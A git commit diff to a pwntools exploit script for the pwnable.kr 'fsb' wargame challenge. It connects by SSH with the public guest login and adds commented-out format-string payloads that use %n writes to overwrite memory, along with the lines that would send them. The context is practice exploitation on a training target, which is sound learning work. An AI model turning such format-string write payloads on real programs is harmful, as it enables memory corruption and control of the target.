b34b65ca9753dbcf1dfdd0c33e21d87b9501bfc4
hogbal <hogbal31@gmail.com>
2020-09-05 02:30:42 -0700

    fsb

--- pwnable.kr/Rookiss/fsb/fsb.py
+++ pwnable.kr/Rookiss/fsb/fsb.py
@@ -5,6 +5,10 @@ s = ssh('fsb','pwnable.kr',port=2222,password='guest')
 n = s.process('./fsb')
 elf = ELF('./fsb')
 
+#payload1 = '%134520836d%14$n'
+#payload2 = '%134514335d%20$n'
 
+#n.sendlineafter('Give me some format strings(1)',payload1)
+#n.sendlineafter('Give me some format strings(2)',payload2)
 
 n.interactive()
